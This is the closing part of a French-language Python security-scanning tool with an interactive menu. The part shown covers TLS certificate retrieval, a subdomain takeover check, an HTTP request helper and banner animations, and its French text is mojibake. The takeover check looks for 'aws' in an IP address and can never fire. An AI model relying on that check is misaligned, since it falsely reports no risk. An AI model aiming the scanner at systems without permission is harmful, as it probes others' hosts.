        return {"target": target, "php_eval_vulnerabilities": results} if results else {"target": target, "php_eval_vulnerabilities": "Aucune vulnÃ©rabilitÃ© dÃ©tectÃ©e"}

    def tls_analysis(self, target):
        """ğŸ” Analyse des certificats SSL/TLS d'un site"""
        try:
            conn = socket.create_connection((target, 443), timeout=5)
            context = ssl.create_default_context()
            with context.wrap_socket(conn, server_hostname=target) as s:
                cert = s.getpeercert()
            return {"target": target, "tls_cert": cert}
        except Exception as e:
            return {"error": f"Impossible d'obtenir le certificat TLS : {e}"}

    def dns_takeover_test(self, target):
        """ğŸŒ Test de prise de contrÃ´le DNS via sous-domaines orphelins"""
        subdomains = ["cdn", "files", "old", "beta"]
        takeover_risks = {}
        for sub in subdomains:
            try:
                resolved_ip = socket.gethostbyname(f"{sub}.{target}")
                if "aws" in resolved_ip.lower() or "cloudflare" in resolved_ip.lower():
                    takeover_risks[sub] = "Potentiel risque de takeover"
            except socket.gaierror:
                continue
        return {"target": target, "dns_takeover": takeover_risks} if takeover_risks else {"target": target, "dns_takeover": "Aucun risque dÃ©tectÃ©"}






    def get_http_response(self, url, method="GET", headers=None, data=None, files=None, timeout=5):
        """ğŸŒ Effectue une requÃªte HTTP et retourne une rÃ©ponse formatÃ©e.
        
        ParamÃ¨tres :
            url (str)      : L'URL Ã  interroger.
            method (str)   : MÃ©thode HTTP Ã  utiliser (GET, POST, etc.), par dÃ©faut "GET".
            headers (dict) : Dictionnaire des headers HTTP (optionnel).
            data (dict)    : DonnÃ©es Ã  envoyer dans le corps de la requÃªte (pour POST, etc.), optionnel.
            files (dict)   : Fichiers Ã  envoyer (optionnel).
            timeout (int)  : Temps d'attente maximal pour la requÃªte, par dÃ©faut 5 secondes.
        
        Retourne :
            dict : Contient "url", "status", "headers" et un Ã©chantillon du "content" (500 premiers caractÃ¨res),
                   ou une clÃ© "error" en cas de problÃ¨me.
        """
        try:
            # Correction de l'URL si nÃ©cessaire
            if not url.startswith("http"):
                url = f"http://{url}"
            # DÃ©finir un User-Agent par dÃ©faut si aucun header n'est fourni
            if headers is None:
                headers = {"User-Agent": "CyberTool/1.0"}
            response = requests.request(method, url, headers=headers, data=data, files=files, timeout=timeout)
            return {
                "url": url,
                "status": response.status_code,
                "headers": dict(response.headers),
                "content": response.text[:500]  # Limite Ã  500 caractÃ¨res pour l'affichage
            }
        except requests.exceptions.ConnectionError:
            return {"error": f"âŒ Erreur de connexion Ã  {url}"}
        except requests.exceptions.Timeout:
            return {"error": f"âŒ› Timeout expirÃ© pour {url}"}
        except requests.exceptions.RequestException as e:
            return {"error": f"âŒ Erreur HTTP : {str(e)}"}






    def display_features_table_hacker(self):
        """ğŸ’» Affiche un tableau interactif des fonctionnalitÃ©s dans un style hacker-full."""
        from rich.live import Live
        from rich.table import Table
        from time import sleep

        table = Table(
            title="[bold green]CYBER-TOOL FUNCTIONALITIES[/bold green]",
            title_style="bold green",
            border_style="green",
            style="green on black"
        )
        table.add_column("ID", justify="center", style="bold cyan")
        table.add_column("Feature", style="bold green")

        with Live(table, refresh_per_second=10, console=self.console):
            for idx, (feature, description) in enumerate(self.feature_map.items(), start=1):
                table.add_row(f"[bold cyan]{idx}[/bold cyan]", f"[bold green]{description}[/bold green]")
                sleep(0.02)  # ğŸ”¥ Effet ultra rapide et fluide

        self.console.print(table)  # Fixe le tableau aprÃ¨s l'affichage


    def run_features(self, feature_name, target):
        """ğŸš€ ExÃ©cute une fonctionnalitÃ© spÃ©cifiÃ©e sur une cible donnÃ©e."""
        self.console.print(f"\n[bold magenta]ğŸš€ ExÃ©cution de {feature_name} sur {target}...[/bold magenta]")
        feature_method = getattr(self, feature_name, None)

        if feature_method:
            result = feature_method(target)
            self.console.print("\n[bold green]ğŸ“œ RÃ©sultat :[/bold green]")
            self.console.print(json.dumps(result, indent=4, ensure_ascii=False))
        else:
            self.console.print(f"âŒ [bold red]Erreur : La fonctionnalitÃ© {feature_name} n'est pas disponible.[/bold red]")


    def run_tool_static(self):
        """ğŸ® Affiche le menu statique et permet d'exÃ©cuter des fonctionnalitÃ©s."""
        while True:
            cyberpunk_loading("Initialisation de Cyber-Tool", duration=1, style="bold magenta")
            self.display_features_table_hacker()  # ğŸ”¥ RÃ©gÃ©nÃ©ration automatique aprÃ¨s chaque exÃ©cution

            feature_choice = Prompt.ask("\n[bold cyan]ğŸ‘‰ Entrez l'ID de la fonctionnalitÃ© Ã  exÃ©cuter (ou 'exit' pour quitter)[/bold cyan]")

            if feature_choice.lower() == "exit":
                self.console.print("\n[bold red]ğŸ‘‹ CyberTool terminÃ©. Ã€ bientÃ´t ![/bold red]")
                break

            try:
                feature_choice = int(feature_choice)
                if 1 <= feature_choice <= len(self.feature_map):
                    feature_name = list(self.feature_map.keys())[feature_choice - 1]
                    target = Prompt.ask("[bold cyan]ğŸ¯ Entrez la cible (URL/IP) Ã  tester[/bold cyan]") 
                    self.run_features(feature_name, target)  # âœ… ExÃ©cution directe sur la cible choisie
                    Prompt.ask("\n[bold yellow]Appuyez sur EntrÃ©e pour revenir au menu...[/bold yellow]")  # ğŸ”¥ Pause avant rÃ©gÃ©nÃ©ration
                else:
                    self.console.print("âŒ [bold red]ID invalide. Veuillez entrer un numÃ©ro valide.[/bold red]")
            except ValueError:
                self.console.print("âŒ [bold red]EntrÃ©e invalide. Veuillez entrer un numÃ©ro.[/bold red]")






# ğŸ”¥ DÃ©tection des dimensions du terminal
TERMINAL_WIDTH, TERMINAL_HEIGHT = shutil.get_terminal_size((80, 24))

# ğŸ”¥ Couleurs funky multicolores fluo brillantes
CYBERPUNK_COLORS = ["bold magenta", "bold cyan", "bold yellow", "bold green", "bold red", "bold blue"]

# ğŸ”¥ Fonction pour afficher une banniÃ¨re alÃ©atoire avec animation et couleurs alÃ©atoires
def animated_random_banner():
    import os, random, time
    # Liste des fichiers de banniÃ¨re
    banner_files = ["banners1.txt", "banners2.txt", "banners3.txt", "banners4.txt", "banners5.txt"]
    # SÃ©lection alÃ©atoire d'un fichier de banniÃ¨re
    selected_banner = random.choice(banner_files)
    banner_path = os.path.join("data", "banners", selected_banner)
    if os.path.exists(banner_path):
        with open(banner_path, "r", encoding="utf-8") as f:
            banner_lines = f.readlines()
        # Affichage animÃ© ligne par ligne avec couleur alÃ©atoire
        for line in banner_lines:
            color = random.choice(CYBERPUNK_COLORS)
            styled_line = f"[{color}]{line.strip().center(TERMINAL_WIDTH)}[/]"
            console.print(styled_line)
            time.sleep(0.03)
    else:
        console.print("[bold red]âš ï¸ ERREUR : Le fichier de banniÃ¨re sÃ©lectionnÃ© est introuvable ![/bold red]")

# ğŸ”¥ Fonction pour afficher "DÃ©veloppÃ© par Karim" avec des couleurs alÃ©atoires
def animated_karim():
    import random
    karim_text = (
        f"[{random.choice(CYBERPUNK_COLORS)}]D[/]"
        f"[{random.choice(CYBERPUNK_COLORS)}]Ã©[/]"
        f"[{random.choice(CYBERPUNK_COLORS)}]v[/]"
        f"[{random.choice(CYBERPUNK_COLORS)}]e[/]"
        f"[{random.choice(CYBERPUNK_COLORS)}]l[/]"
        f"[{random.choice(CYBERPUNK_COLORS)}]o[/]"
        f"[{random.choice(CYBERPUNK_COLORS)}]p[/]"
        f"[{random.choice(CYBERPUNK_COLORS)}]p[/]"
        f"[{random.choice(CYBERPUNK_COLORS)}]Ã©[/]"
        f"[bold white] par [/]"
        f"[{random.choice(CYBERPUNK_COLORS)}]K[/]"
        f"[{random.choice(CYBERPUNK_COLORS)}]A[/]"
        f"[{random.choice(CYBERPUNK_COLORS)}]R[/]"
        f"[{random.choice(CYBERPUNK_COLORS)}]I[/]"
        f"[{random.choice(CYBERPUNK_COLORS)}]M[/]"
    )
    console.print(Panel(karim_text, border_style="green", title="[bold cyan]INFO[/bold cyan]"), justify="left")

# ğŸ”¥ Fonction pour un chargement cyberpunk optimisÃ©
def cyberpunk_loading(task_name, duration=2, style="bold cyan", spinner="dots"):
    from rich.progress import Progress, BarColumn, TimeElapsedColumn, TextColumn, SpinnerColumn
    with Progress(
        SpinnerColumn(spinner),
        TextColumn(f"[bold {style}]â³ {{task.fields[title]}}...[/bold {style}]"),
        BarColumn(bar_width=50, style=style),
        TimeElapsedColumn(),
        console=console,
    ) as progress:
        task = progress.add_task("", total=duration, title=task_name)
        for _ in range(duration):
            time.sleep(0.7)
            progress.update(task, advance=1)





if __name__ == "__main__":
    console.clear()  # Nettoyage complet du terminal

    # GÃ©nÃ©rer un thÃ¨me de couleurs alÃ©atoire Ã  partir d'une liste plus large
    import random
    ALL_COLORS = [
        "bold magenta", "bold cyan", "bold yellow", "bold green", "bold red", "bold blue",
        "bold white", "bold bright_green", "bold bright_red", "bold bright_yellow",
        "bold bright_blue", "bold bright_magenta"
    ]
    # SÃ©lectionne 6 couleurs au hasard pour le thÃ¨me Cyber-Tool
    CYBERPUNK_COLORS = random.sample(ALL_COLORS, 6)

    # Affichage d'une banniÃ¨re alÃ©atoire utilisant le nouveau thÃ¨me
    animated_random_banner()  # Cette fonction doit utiliser la variable CYBERPUNK_COLORS pour chaque ligne
    animated_karim()         # Affichage de "DÃ©veloppÃ© par Karim" en utilisant Ã©galement le thÃ¨me alÃ©atoire

    cyber_tool = CyberTool()  # Initialisation de Cyber-Tool
    cyber_tool.run_tool_static()  # Lancement du menu interactif statique
